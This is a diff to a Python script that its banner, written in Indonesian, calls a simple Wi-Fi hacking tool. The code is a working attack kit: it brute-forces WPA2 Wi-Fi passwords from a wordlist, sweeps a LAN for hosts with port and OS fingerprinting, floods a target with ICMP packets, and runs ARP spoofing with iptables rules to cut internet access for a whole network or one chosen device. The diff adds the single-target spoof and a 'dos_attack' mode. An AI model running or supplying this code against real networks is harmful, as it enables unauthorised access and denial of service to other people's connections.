@@ -4,11 +4,12 @@ from pywifi import const
 from pywifi import Profile
 from scapy.all import *
 from mac_vendor_lookup import MacLookup, VendorNotFoundError
-import time, argparse, os, pyfiglet, socket, struct, random, platform
+import time, argparse, os, pyfiglet, socket, struct, random, platform, subprocess, re
 from termcolor import colored
+from colorama import Fore, Style, init
 
 def cracking(ssid, wordlist):
-        print("Cracking Wifi Password ", ssid ,", Please Wait...")
+        print("[+]Cracking password Wi-fi ssid: ", ssid ,", silahkan tunggu...")
         word = open(wordlist, "r")
   
         for passw in word:
@@ -18,7 +19,7 @@ def cracking(ssid, wordlist):
             profile.akm.append(const.AKM_TYPE_WPA2PSK)
             profile.cipher = const.CIPHER_TYPE_CCMP
             passw=passw.strip()
-            print("Trying:",passw)
+            print("Mencoba password:",passw)
             profile.key = passw
             wifi = pywifi.PyWiFi()
             iface = wifi.interfaces()[0]
@@ -29,14 +30,14 @@ def cracking(ssid, wordlist):
             time.sleep(4)
             if iface.status() == const.IFACE_CONNECTED:
                 print(passw)
-                print('PASSWORD FOUND! SSID:' ,ssid,'PASSWORD:',passw)
+                print('[✅]PASSWORD ditemukan! SSID:' ,ssid,'PASSWORD:',passw)
                 break
         else:
-            print("Password Not In List")
+            print("Password tidak di list")
             
 def scan_wifi():
-    print("Scanning for wifi devices")
-    print("Please Wait")
+    print("[+]Men-scan jaringan Wi-Fi Tersedia")
+    print("[+]Tunggu sebentar...")
     
     wifi = PyWiFi()  
     iface = wifi.interfaces()[0]  
@@ -58,48 +59,92 @@ def scan_wifi():
     for ssid in available_devices:
         print(ssid)
 
-def get_vendor(mac_address):
-    try:
-        return mac_look.lookup(mac_address)
-    except VendorNotFoundError:
-        return "Unknown"
+def check_mac(ip):
+    result = subprocess.run(['arp', '-n', ip], capture_output=True, text=True)
+    output = result.stdout
+    mac_pattern = r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'
+    match = re.search(mac_pattern, output)
+
+    if match:
+      return match.group(0)
+    else:
+      return "MAC Not Found"
+
+def check_port(ip, port, PORT_SERVICES):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(1)
+        
+        if s.connect_ex((ip, port)) == 0:
+            service = PORT_SERVICES.get(port, "Unknown")
+            print(f"Port {port} terbuka - {service}")
+
+    return "Unknown"
+            
+def check_os(ttl):
+    OS_TTL_DATABASE = {
+        (0, 64): "Linux/Unix",
+        (65, 128): "Windows",
+        (129, 255): "Cisco/Network Device",
+        (256, 1000): "Solaris/AIX"
+    }
+
+    for (min_ttl, max_ttl), os_name in OS_TTL_DATABASE.items():
+        if min_ttl <= ttl <= max_ttl:
+            return os_name
+            
+    return "Unknown OS"
 
 def scan_ip(gateway):
-  conf.iface = "wlp2s0"
-  mac_look = MacLookup()
+    PORT_SERVICES = {
+     21: "FTP - Open",
+     22: "SSH - Open", 
+     23: "Telnet - Open",
+     25: "SMTP - Open",
+     53: "DNS - Open",
+     80: "HTTP - Open",
+     110: "POP3 - Open",
+     135: "RPC - Open",
+     139: "NetBIOS - Open",
+     143: "IMAP - Open",
+     445: "SMB - Open",
+     1433: "MSSQL - Open",
+     1434: "MSSQL Browser - Open",
+     3306: "MySQL - Open",
+     3389: "RDP - Open",
+     5900: "VNC - Open",
+     6379: "Redis - Open",
+     27017: "MongoDB - Open"
+    }
 
-  new_ip = re.sub(r'^(\d+\.\d+\.\d+)\.\d+(/24)$', r'\1.0\2', gateway)
-
-  print('[*]Menscan IP Address...')
-  eth = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=new_ip)
-  result = srp(eth, timeout=2, verbose=0)[0]
-  res = []
-
-  print('[+]Menyiapkan IP Address')
-
-  try:
-    mac_look.update_vendors()
-  except Exception as e:
-    print(f"Warning: Gagal update vendor database: {e}")
+    print(f"[+]Script berjalan di: {platform.system()}")
     
-  for sent, received in result:
-    try:
-        vendor = mac_look.lookup(received.hwsrc)
-    except VendorNotFoundError:
-        vendor = "Unknown"
+    for x in range(1, 255):
+     try:
+      if platform.system() == 'Linux':
+       count = "1"
+       ip = gateway + str(x)
 
-    res.append({'ip': received.psrc, 'mac': received.hwsrc, 'vendor': vendor})
+       res = subprocess.run(["ping", "-c", count, "-W", count, ip], capture_output=True, text=True, timeout=10)
+       output = res.stdout
+      
+       if res.returncode == 0:
+        print(f"[+]IP Ditemukan: {ip}")
+        ttl_match = re.search(r'ttl=(\d+)', output.lower())
+        ttl = int(ttl_match.group(1)) if ttl_match else 64
+        c = check_os(ttl)
+        print(f"OS: {c}")
+        ma = check_mac(ip)
+        print(f"MAC Address: {ma}")
 
-  if len(res) == 0:
-    print('[!]IP Address tidak ditemukan. coba periksa IP Gateway')
-    sys.exit()
-  else:
-    pass
+        for port in PORT_SERVICES.keys():
+            check_port(ip, port, PORT_SERVICES)
 
-  print('IP Address    MAC Address    Vendor')
-  
-  for o in res:
-    print(o)
+        print()
+     except subprocess.TimeoutExpired:
+        print("e")
+        pass
+
+    print("[+]Selesai")
 
 def checksum(data):
     s = 0
@@ -138,7 +183,7 @@ def icmp_attack(ip, loop, pay):
       packet = icmp_header + payload
       sock.sendto(packet, (ip, 1))
       seq = (seq + 1) & 0xFFFF 
-      print("Mengirim ICMP Paket, Loop:" ,x)
+      print("[+]Mengirim ICMP Paket, Loop:" ,x)
         
 def split_ip(ip):
     return ip.rsplit('.', 1)[0] + "."
@@ -147,12 +192,12 @@ def change_ip(gateway):
     return gateway.rsplit('.', 1)[0] + ".0/24"
 
 def enable_forwarding():
+    print("[+] IP forwarding aktif.")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    print("[+] IP forwarding enabled.")
 
 def disable_forwarding():
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    print("[+] IP forwarding disabled.")
+    print("[+] IP forwarding mati.")
 
 def block_internet(iface):
     os.system("iptables -P FORWARD DROP")
@@ -161,30 +206,29 @@ def block_internet(iface):
     os.system(f"iptables -A OUTPUT -o {iface} -j DROP")
     os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
     os.system("iptables -A OUTPUT -p udp --dport 53 -j DROP")
-    print("[+] Internet access blocked for all devices.")
+    print("[+] Akses Internet diblokir.")
 
-def setup_tc(iface, limit_speed):
-    os.system(f"tc qdisc add dev {iface} root handle 1: htb default 30")
-    os.system(f"tc class add dev {iface} parent 1: classid 1:1 htb rate {limit_speed} ceil {limit_speed}")
-    os.system(f"tc filter add dev {iface} protocol ip parent 1:0 prio 1 u32 match ip dst 0.0.0.0/0 flowid 1:1")
-    print(f"[+] Bandwidth limited to {limit_speed} for all devices.")
+def block_internet_single(host):
+    os.system(f"iptables -A FORWARD -s {host} -j DROP")
+    print("[+] Akses Internet diblokir hanya satu target.")
     
 def unblock_internet():
     os.system("iptables -F")
     os.system("iptables -X")
     os.system("iptables -P FORWARD ACCEPT")
     os.system("iptables -P OUTPUT ACCEPT")
-    print("[+] Internet access restored.")
+    print("[+] Akses Internet dikembalikan.")
 
-def clear_tc():
-    os.system(f"tc qdisc del dev {iface} root")
-    print("[+] Bandwidth limit removed.")
-
+def unblock_internet_single():
+    os.system("iptables -F")
+    print("[+] Akses Internet dikembalikan.")
+    
 def scan_hosts(ip_range, iface, gateway_ip):
-    print("[+] Scanning network for devices...")
+    print("[+] Men-scan IP yang tersedia...")
     ans, _ = arping(ip_range, iface=iface, timeout=2, verbose=False)
     hosts = [rcv.psrc for snd, rcv in ans if rcv.psrc != gateway_ip]
-    print(f"[+] Found devices: {hosts}")
+    print(f"[+] IP ditemukan: {hosts}")
+    time.sleep(1.0)
     return hosts
 
 def arp_spoof(host, gateway_ip, iface):
@@ -207,8 +251,26 @@ def arp_spoof(host, gateway_ip, iface):
         except Exception:
             break
 
+def arp_spoof_single(host, gateway_ip, iface):
+    target_mac = getmacbyip(host)
+    attacker_mac = get_if_hwaddr(iface)
+    gateway_mac = getmacbyip(gateway_ip)
+
+    pkt_to_target = Ether(dst=target_mac) / ARP(op=2, pdst=host, hwdst=target_mac, 
+                                                psrc=gateway_ip, hwsrc=attacker_mac)
+    
+    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
+                                                  psrc=host, hwsrc=attacker_mac)
+
+    while True:
+        try:
+            sendp(pkt_to_target, iface=iface, verbose=False)
+            sendp(pkt_to_gateway, iface=iface, verbose=False)
+            time.sleep(1.5)
+        except Exception:
+            break
+        
 def broadcast_arp(pdst, iface, gateway_ip):
-    """ARP broadcast untuk semua host sekaligus"""
     mac = get_if_hwaddr(iface)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     arp = ARP(op=2, pdst=pdst, psrc=gateway_ip, hwsrc=mac, hwdst="ff:ff:ff:ff:ff:ff")
@@ -237,31 +299,28 @@ def main():
  ascii_art = pyfiglet.figlet_format("WiFi Tool")
  colored_art = colored(ascii_art, "cyan", attrs=["bold"])
  print(colored_art)
+ print(Fore.RED + "--------------------------------------------------------------------------------------------------------")
+ print()
+ print(Fore.LIGHTGREEN_EX + "Sebuah tool simpel untuk melakukan hacking di jaringan wifi.")
+ print(Fore.LIGHTGREEN_EX + "seperti Brute Force Password Wi-Fi, ICMP Flood, dan stop Internet.")
+ print(Fore.LIGHTGREEN_EX + "tentang cara penggunaan ketik 'python run.py --help'.")
+ print(Fore.LIGHTGREEN_EX + "dan tekan ctrl +c untuk menghentikan program apapun.")
+ print(Fore.LIGHTGREEN_EX + "Versi: 1.0.0")
+ print(Fore.LIGHTGREEN_EX + "Bahasa: Python")
+ print(Fore.LIGHTGREEN_EX + "Github: https://github.com/Yogadwi-a/WifiLanhacktools.git")
+ print()
 
- print("Cara Pakai: python3 run.py --c[pilihan]")
- print()
- print("Untuk Bruteforce Wifi password:")
- print("Untuk scan Wi-Fi: python3 run.py --c scan_wifi_lists ")
- print("Untuk melakukan serangan brute force Wi-Fi : python3 run.py --c crack_wifi_password --s TARGET_WIFI --w WORDLIST.txt")
- print()
- print("Untuk ICMP Flood:")
- print("Untuk scan LAN IP: python3 run.py --c scan_ip --g GATEWAY_IP")
- print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM --pay JUMLAH_PAYLOAD")
- print()
- print("Untuk Stop Internet:")
- print("Untuk melakukan serangan: python3 run.py --c stop_internet --g GATEWAY --i INTERFACE --m MODE --p IP 3 DIGIT PERTAMA .255 ex(192.168.1.255)")
-
- parser = argparse.ArgumentParser()
- parser.add_argument('--loop', help='Gateway target untuk scan ip. cara penggunaan: --gateway 192.168.1.1/24')
- parser.add_argument('--ip', help='Gateway target untuk scan ip dan untuk ip attacker. cara penggunaan: --ip 192.168.1.1/24')
- parser.add_argument('--g', help='Gateway target untuk scan ip dan untuk gateway. cara penggunaan: --g 192.168.1.1/24')
- parser.add_argument('--s', help='SSID target (hanya untuk mode brute)')
- parser.add_argument('--w', help='Path ke file wordlist (hanya untuk mode brute)')
- parser.add_argument('--i', help='Interface atau hardware penghubung')
+ parser = argparse.ArgumentParser(description="Contoh perintah untuk menjalankan program")
+ parser.add_argument('--loop', help='Loop untuk serangan ICMP Attack untuk melakukan perulangan')
+ parser.add_argument('--ip', help='IP target untuk icmp attack untuk argumen IP (cara penggunaan: --ip 192.168.1.1)')
+ parser.add_argument('--g', help='Gateway target untuk argumen scan_ip (cara penggunaan: --g 192.168.1.1/24), dan untuk gateway untuk argumen stop internet (cara penggunaan: --g 192.168.1.1)')
+ parser.add_argument('--s', help='SSID target untuk Brute Force Password Wi-Fi')
+ parser.add_argument('--w', help='Path file wordlist untuk Brute Force Password Wi-Fi')
+ parser.add_argument('--i', help='Interface atau hardware penghubung untuk stop internet')
  parser.add_argument('--m', help='pilih mode untuk stop internet')
  parser.add_argument('--p', help='pdst untuk stop internet')
  parser.add_argument('--pay', help='untuk kirim payload')
- parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'stop_internet'], help="Aksi yang ingin dilakukan")
+ parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dos_attack'], help="Aksi yang ingin dilakukan")
  args = parser.parse_args()
 
  if args.c == 'scan_wifi_lists':
@@ -269,45 +328,53 @@ def main():
  elif args.c == 'crack_wifi_password':
   cracking(args.s, args.w)
  elif args.c == 'scan_ip':
-  scan_ip(args.g)
+  g = args.g
+  gateway = g.rsplit('.', 1)[0] + "."
+  print(f"[+] Scanning IP {gateway}")
+  print("[+] Tekan ctrl + c untuk berhenti")
+  time.sleep(1.0)
+  scan_ip(gateway)
  elif args.c == 'icmp_attack':
   icmp_attack(args.ip, args.loop, args.pay)
- elif args.c == 'stop_internet':
+ elif args.c == 'dos_attack':
   ip_range = change_ip(args.g)
   gateway_ip = args.g
   iface = args.i
-  pdst = args.p
 
-  if args.m == 'deauth':
-   print(args.m)
+  if args.m == 'all':
+   pdst = args.p
+   print("[+] Memulai DOS Attack pada 1 jaringan")
+   time.sleep(1.0)
    enable_forwarding()
+   time.sleep(1.0)
    hosts = scan_hosts(ip_range, iface, gateway_ip)
    block_internet(iface)
-   print("[+] Starting ARP spoofing on all devices...")
+   print("[+] Serangan ARP Spoof aktif...")
    threads = start_spoofing(hosts, pdst, iface, gateway_ip)
   
    try:
      while True:
          time.sleep(1)
    except KeyboardInterrupt:
-         print("\n[!] Stopping...")
+         print("\n[!] Stop...")
          unblock_internet()
          disable_forwarding()
-  elif args.m == 'limit':
-   print(args.m)
-   limit_speed = args.l
+         
+  elif args.m == 'single':
+   host = args.ip
+   print("[+] Memulai DOS Attack pada target" ,host)
+   time.sleep(1.0)
    enable_forwarding()
-   hosts = scan_hosts(ip_range, iface, gateway_ip)
-   setup_tc(iface, limit_speed)
-   print("[+] Starting ARP spoofing on all devices...")
-   threads = start_spoofing(hosts, pdst, iface, gateway_ip)
-  
+   block_internet_single(host)
+   print("[+] Serangan ARP Spoof aktif..." ,host)
+   arp_spoof_single(host, gateway_ip, iface)
+
    try:
      while True:
          time.sleep(1)
    except KeyboardInterrupt:
-         print("\n[!] Stopping...")
-         clear_tc()
+         print("\n[!] Stop...")
+         unblock_internet_single()
          disable_forwarding()
-         
+
 main()
